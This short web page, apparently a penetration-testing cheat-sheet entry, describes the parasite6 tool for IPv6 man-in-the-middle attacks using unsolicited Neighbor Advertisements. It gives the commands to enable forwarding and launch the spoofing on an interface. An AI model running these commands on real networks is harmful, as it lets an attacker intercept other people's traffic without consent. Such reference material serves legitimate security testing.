<title>Parasite6</title>
</head><body>[parasite6]() | Attempts to create a symmetric MitM with unsolicited NA with the <br/>
override flag<br/>
<br/>
This technique is good for a few devices, but does not scale well. <br/>
<br/>
Ensure forwarding is set up (so you don't DoS clients)<br/>
# sysctl -w net.ipv6.conf.all.forwarding=1<br/>
# parasite6 -lR eth0</body></html>
